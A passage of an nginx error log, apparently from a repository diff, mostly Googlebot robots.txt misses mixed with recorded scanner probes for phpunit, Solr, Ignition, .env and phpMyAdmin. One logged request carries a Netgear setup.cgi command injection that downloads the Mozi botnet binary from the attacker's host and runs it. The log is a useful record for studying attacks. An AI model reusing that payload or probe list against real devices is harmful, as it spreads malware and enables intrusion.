+2022/06/03 06:57:31 [error] 23#23: *1368 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 193.106.191.48, server: localhost, request: "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "159.75.219.167:80"
+2022/06/03 07:14:27 [error] 23#23: *1370 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.134, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.4451.dgphb.com"
+2022/06/03 07:15:47 [error] 23#23: *1373 open() "/usr/share/nginx/html/fuN3" failed (2: No such file or directory), client: 172.104.138.223, server: localhost, request: "GET /fuN3 HTTP/1.0"
+2022/06/03 07:23:14 [error] 23#23: *1374 open() "/usr/share/nginx/html/setup.cgi" failed (2: No such file or directory), client: 117.194.163.51, server: localhost, request: "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://117.194.163.51:39293/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0"
+2022/06/03 07:24:05 [error] 23#23: *1375 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.88, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.792.dgphb.com"
+2022/06/03 07:33:41 [error] 23#23: *1378 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.73, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.86203.dgphb.com"
+2022/06/03 07:43:18 [error] 23#23: *1381 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.45, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "21689.dgphb.com"
+2022/06/03 07:46:57 [error] 23#23: *1384 open() "/usr/share/nginx/html/solr/admin/info/system" failed (2: No such file or directory), client: 193.106.191.48, server: localhost, request: "GET /solr/admin/info/system?wt=json HTTP/1.1", host: "159.75.219.167:80"
+2022/06/03 07:50:26 [error] 23#23: *1385 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.62, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.3049.dgphb.com"
+2022/06/03 07:50:26 [error] 23#23: *1386 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.84, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "160523.dgphb.com"
+2022/06/03 07:50:26 [error] 23#23: *1387 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.44, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.6255.dgphb.com"
+2022/06/03 07:56:34 [error] 23#23: *1398 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.37, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.5633.dgphb.com"
+2022/06/03 08:02:42 [error] 23#23: *1403 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.54, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.199114.dgphb.com"
+2022/06/03 08:08:50 [error] 23#23: *1406 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.126, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.39793.dgphb.com"
+2022/06/03 08:14:58 [error] 23#23: *1409 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.30, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.6286.dgphb.com"
+2022/06/03 08:21:06 [error] 23#23: *1412 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.8, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.9404.dgphb.com"
+2022/06/03 08:26:54 [error] 23#23: *1416 open() "/usr/share/nginx/html/editBlackAndWhiteList" failed (2: No such file or directory), client: 94.71.85.200, server: localhost, request: "POST /editBlackAndWhiteList HTTP/1.1", host: "159.75.219.167:80"
+2022/06/03 08:27:14 [error] 23#23: *1417 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.6, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.93407.dgphb.com"
+2022/06/03 08:30:30 [error] 23#23: *1436 "/usr/share/nginx/html/english/index.php" is not found (2: No such file or directory), client: 125.84.239.203, server: localhost, request: "GET http://www.rfa.org/english/ HTTP/1.1", host: "www.rfa.org"
+2022/06/03 08:33:21 [error] 23#23: *1442 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.55, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.749.dgphb.com"
+2022/06/03 08:35:26 [error] 23#23: *1447 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.23, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.40078.dgphb.com"
+2022/06/03 08:39:29 [error] 23#23: *1450 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.198, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.21738.dgphb.com"
+2022/06/03 08:45:37 [error] 23#23: *1453 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.28, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.194019.dgphb.com"
+2022/06/03 08:51:45 [error] 23#23: *1456 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.23, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.161237.dgphb.com"
+2022/06/03 08:57:07 [error] 23#23: *1459 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.43, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.26742.dgphb.com"
+2022/06/03 09:00:43 [error] 23#23: *1466 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 185.196.220.81, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "159.75.219.167:80", referrer: "http://159.75.219.167:80/admin/login.asp"
+2022/06/03 09:01:46 [error] 23#23: *1467 open() "/usr/share/nginx/html/editBlackAndWhiteList" failed (2: No such file or directory), client: 112.27.189.238, server: localhost, request: "POST /editBlackAndWhiteList HTTP/1.1", host: "167.219.75.159:9000"
+2022/06/03 09:02:29 [error] 23#23: *1468 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.1, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "4532.dgphb.com"
+2022/06/03 09:07:51 [error] 23#23: *1471 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.3, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "84266.dgphb.com"
+2022/06/03 09:13:12 [error] 23#23: *1474 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.90, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.1473.dgphb.com"
+2022/06/03 09:18:34 [error] 23#23: *1479 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.176, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.55857.dgphb.com"
+2022/06/03 09:24:03 [error] 23#23: *1486 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.3, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "vecy.dgphb.com"
+2022/06/03 09:29:24 [error] 23#23: *1489 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.51, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.21689.dgphb.com"
+2022/06/03 09:34:46 [error] 23#23: *1492 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.141, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.27758.dgphb.com"
+2022/06/03 09:39:49 [error] 23#23: *1495 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.86, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.1950.dgphb.com"
+2022/06/03 09:40:08 [error] 23#23: *1498 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.92, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.2137.dgphb.com"
+2022/06/03 09:45:30 [error] 23#23: *1501 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.30, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.54721.dgphb.com"
+2022/06/03 09:50:52 [error] 23#23: *1504 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.55, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.1301.dgphb.com"
+2022/06/03 09:56:14 [error] 23#23: *1507 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.202, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.4407.dgphb.com"
+2022/06/03 10:01:36 [error] 23#23: *1514 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.79, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.69585.dgphb.com"
+2022/06/03 10:06:58 [error] 23#23: *1517 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.7, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.515.dgphb.com"
+2022/06/03 10:12:20 [error] 23#23: *1522 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.21, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.5574.dgphb.com"
+2022/06/03 10:17:41 [error] 23#23: *1525 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.116, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.71808.dgphb.com"
+2022/06/03 10:19:34 [error] 23#23: *1528 "/usr/share/nginx/html/console/index.php" is not found (2: No such file or directory), client: 193.106.191.48, server: localhost, request: "GET /console/ HTTP/1.1", host: "159.75.219.167:80"
+2022/06/03 10:23:04 [error] 23#23: *1529 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.233, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.2105.dgphb.com"
+2022/06/03 10:33:47 [error] 23#23: *1532 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.59, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.6438.dgphb.com"
+2022/06/03 10:39:09 [error] 23#23: *1535 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.142, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "c6crr.dgphb.com"
+2022/06/03 10:44:31 [error] 23#23: *1538 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.29, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.8w6kr.dgphb.com"
+2022/06/03 10:49:53 [error] 23#23: *1541 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.125, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.45261.dgphb.com"
+2022/06/03 10:52:55 [error] 23#23: *1544 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.42, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "20236.dgphb.com"
+2022/06/03 10:52:55 [error] 23#23: *1545 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.15, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "80501.dgphb.com"
+2022/06/03 10:54:08 [error] 23#23: *1550 open() "/usr/share/nginx/html/Autodiscover/Autodiscover.xml" failed (2: No such file or directory), client: 193.106.191.48, server: localhost, request: "POST /Autodiscover/Autodiscover.xml HTTP/1.1", host: "159.75.219.167:80"
+2022/06/03 10:58:54 [error] 23#23: *1551 open() "/usr/share/nginx/html/.env" failed (2: No such file or directory), client: 163.172.88.201, server: localhost, request: "GET ///.env HTTP/1.1", host: "159.75.219.167"
+2022/06/03 11:31:24 [error] 23#23: *1573 open() "/usr/share/nginx/html/_ignition/execute-solution" failed (2: No such file or directory), client: 193.106.191.48, server: localhost, request: "GET /_ignition/execute-solution HTTP/1.1", host: "159.75.219.167:80"
+2022/06/03 11:37:55 [error] 23#23: *1574 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.9, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.7309.dgphb.com"
+2022/06/03 11:40:34 [error] 23#23: *1577 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.153, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.7480.dgphb.com"
+2022/06/03 11:45:36 [error] 23#23: *1580 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.225, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.92268.dgphb.com"
+2022/06/03 11:45:36 [error] 23#23: *1581 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.170, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.5956.dgphb.com"
+2022/06/03 12:04:45 [error] 23#23: *1594 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.54, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "99599.dgphb.com"
+2022/06/03 12:07:44 [error] 23#23: *1598 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 2.56.57.72, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "159.75.219.167:80", referrer: "http://159.75.219.167:80/admin/login.asp"
+2022/06/03 12:23:54 [error] 23#23: *1599 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.42, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "896.dgphb.com"
+2022/06/03 12:43:03 [error] 23#23: *1608 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.16, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "31821.dgphb.com"
+2022/06/03 13:13:43 [error] 23#23: *1621 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.177, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.670.dgphb.com"
+2022/06/03 13:44:23 [error] 23#23: *1630 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.22, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "57035.dgphb.com"
+2022/06/03 13:53:49 [error] 23#23: *1633 open() "/usr/share/nginx/html/actuator/gateway/routes" failed (2: No such file or directory), client: 193.106.191.48, server: localhost, request: "GET /actuator/gateway/routes HTTP/1.1", host: "159.75.219.167:80"
+2022/06/03 14:08:35 [error] 23#23: *1634 open() "/usr/share/nginx/html/editBlackAndWhiteList" failed (2: No such file or directory), client: 221.154.65.248, server: localhost, request: "POST /editBlackAndWhiteList HTTP/1.1", host: "159.75.219.167:88"
+2022/06/03 14:08:41 [error] 23#23: *1652 "/usr/share/nginx/html/english/index.php" is not found (2: No such file or directory), client: 36.32.3.225, server: localhost, request: "GET http://www.rfa.org/english/ HTTP/1.1", host: "www.rfa.org"
+2022/06/03 14:15:03 [error] 23#23: *1659 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.36, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.61162.dgphb.com"
+2022/06/03 14:45:43 [error] 23#23: *1662 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.173, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.670.dgphb.com"
+2022/06/03 14:46:44 [error] 23#23: *1663 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.71, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.154094.dgphb.com"
+2022/06/03 14:46:44 [error] 23#23: *1664 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.46, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "62068.dgphb.com"
+2022/06/03 14:46:45 [error] 23#23: *1667 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.142, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.92087.dgphb.com"
+2022/06/03 14:49:07 [error] 23#23: *1672 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.180, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.6655.dgphb.com"
+2022/06/03 14:52:27 [error] 23#23: *1677 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.203, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.962.dgphb.com"
+2022/06/03 14:53:52 [error] 23#23: *1680 open() "/usr/share/nginx/html/editBlackAndWhiteList" failed (2: No such file or directory), client: 124.123.123.40, server: localhost, request: "POST /editBlackAndWhiteList HTTP/1.1", host: "159.75.219.167:80"
+2022/06/03 14:55:46 [error] 23#23: *1681 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.78, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "42877.dgphb.com"
+2022/06/03 14:59:07 [error] 23#23: *1686 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.187, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.cvyeic.dgphb.com"
+2022/06/03 15:02:27 [error] 23#23: *1691 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.230, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.3629.dgphb.com"
+2022/06/03 15:05:48 [error] 23#23: *1696 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.44, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.26742.dgphb.com"
+2022/06/03 15:09:08 [error] 23#23: *1699 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.68, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.50827.dgphb.com"
+2022/06/03 15:09:35 [error] 23#23: *1702 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.80, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.1966.dgphb.com"
+2022/06/03 15:12:29 [error] 23#23: *1705 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.45, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.274587.dgphb.com"
+2022/06/03 15:15:49 [error] 23#23: *1710 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.220, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.5944.dgphb.com"
+2022/06/03 15:19:10 [error] 23#23: *1713 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.223, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.61393.dgphb.com"
+2022/06/03 15:22:30 [error] 23#23: *1716 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.85, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.6202.dgphb.com"
+2022/06/03 15:25:50 [error] 23#23: *1719 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.31, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.66672.dgphb.com"
+2022/06/03 15:29:11 [error] 23#23: *1722 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.198, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.3944.dgphb.com"
+2022/06/03 15:31:44 [error] 23#23: *1725 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.63, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "5407.dgphb.com"
+2022/06/03 15:31:45 [error] 23#23: *1726 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.127, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.62195.dgphb.com"
+2022/06/03 15:32:32 [error] 23#23: *1727 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.217, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.54263.dgphb.com"
+2022/06/03 15:35:52 [error] 23#23: *1732 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.76, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.107972.dgphb.com"
+2022/06/03 15:39:13 [error] 23#23: *1737 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.207, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.77833.dgphb.com"
+2022/06/03 15:42:33 [error] 23#23: *1740 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.153, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "190743.dgphb.com"
+2022/06/03 15:43:32 [error] 23#23: *1743 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 150.242.97.183, server: localhost, request: "GET /phpmyadmin/index.php HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "159.75.219.167", referrer: "http://159.75.219.167/phpmyadmin/index.php"
+2022/06/03 15:43:41 [error] 23#23: *1743 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 150.242.97.183, server: localhost, request: "GET /pmd/index.php HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "159.75.219.167", referrer: "http://159.75.219.167/pmd/index.php"
+2022/06/03 15:43:52 [error] 23#23: *1743 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 150.242.97.183, server: localhost, request: "GET /phpmyadmin4.8.5/index.php HTTP/1.1", upstream: "fastcgi://172.27.0.3:9000", host: "159.75.219.167", referrer: "http://159.75.219.167/phpmyadmin4.8.5/index.php"
+2022/06/03 15:45:54 [error] 23#23: *1747 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.61, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.5341.dgphb.com"
+2022/06/03 15:49:14 [error] 23#23: *1750 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.215, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.23299.dgphb.com"
+2022/06/03 15:52:35 [error] 23#23: *1753 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.97, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.5538.dgphb.com"
+2022/06/03 15:55:55 [error] 23#23: *1756 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.63, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.6478.dgphb.com"
+2022/06/03 15:59:16 [error] 23#23: *1759 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.45, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "21689.dgphb.com"
+2022/06/03 16:02:36 [error] 23#23: *1762 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.55, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "1024.dgphb.com"
+2022/06/03 16:05:57 [error] 23#23: *1765 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.158, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.2175.dgphb.com"
+2022/06/03 16:09:33 [error] 23#23: *1772 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.239, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.36129.dgphb.com"
+2022/06/03 16:12:38 [error] 23#23: *1777 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.193, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "76125.dgphb.com"
+2022/06/03 16:15:23 [error] 23#23: *1780 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.143, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "8447.dgphb.com"
+2022/06/03 16:16:45 [error] 23#23: *1783 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.5, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.89835.dgphb.com"
+2022/06/03 16:18:08 [error] 23#23: *1786 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.210, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.96475.dgphb.com"
+2022/06/03 16:20:51 [error] 23#23: *1791 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.40, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.5633.dgphb.com"
+2022/06/03 16:23:39 [error] 23#23: *1796 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.140, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.58337.dgphb.com"
+2022/06/03 16:26:20 [error] 23#23: *1799 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.202, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "36358.dgphb.com"
+2022/06/03 16:27:22 [error] 23#23: *1802 open() "/usr/share/nginx/html/hudson" failed (2: No such file or directory), client: 192.241.219.19, server: localhost, request: "GET /hudson HTTP/1.1", host: "159.75.219.167"
+2022/06/03 16:29:08 [error] 23#23: *1803 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.156, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "28898.dgphb.com"
+2022/06/03 16:31:52 [error] 23#23: *1806 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.22, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.20236.dgphb.com"
+2022/06/03 16:34:37 [error] 23#23: *1811 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.49, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.3900.dgphb.com"
+2022/06/03 16:37:21 [error] 23#23: *1814 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.249, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.5384.dgphb.com"
+2022/06/03 16:40:06 [error] 23#23: *1817 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.7, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.91832.dgphb.com"
+2022/06/03 16:42:51 [error] 23#23: *1822 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.3, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "225.dgphb.com"
+2022/06/03 16:45:36 [error] 23#23: *1825 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.19, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.7944.dgphb.com"
+2022/06/03 16:48:20 [error] 23#23: *1828 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.94, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.64504.dgphb.com"
+2022/06/03 16:51:04 [error] 23#23: *1831 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.34, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.84266.dgphb.com"
+2022/06/03 16:53:49 [error] 23#23: *1836 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.82, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "2847.dgphb.com"
+2022/06/03 16:56:36 [error] 23#23: *1843 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.92, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.19474.dgphb.com"
+2022/06/03 16:58:40 [error] 23#23: *1846 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.210, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "8558.dgphb.com"
+2022/06/03 16:59:19 [error] 23#23: *1849 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.15, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.2279.dgphb.com"
+2022/06/03 17:04:48 [error] 23#23: *1852 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.110, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "81572.dgphb.com"
+2022/06/03 17:07:33 [error] 23#23: *1855 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.154, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "99885.dgphb.com"
+2022/06/03 17:10:18 [error] 23#23: *1858 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.88, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.cv6kky.dgphb.com"
+2022/06/03 17:10:48 [error] 23#23: *1861 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.227, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "60001.dgphb.com"
+2022/06/03 17:13:02 [error] 23#23: *1864 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.233, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.72946.dgphb.com"
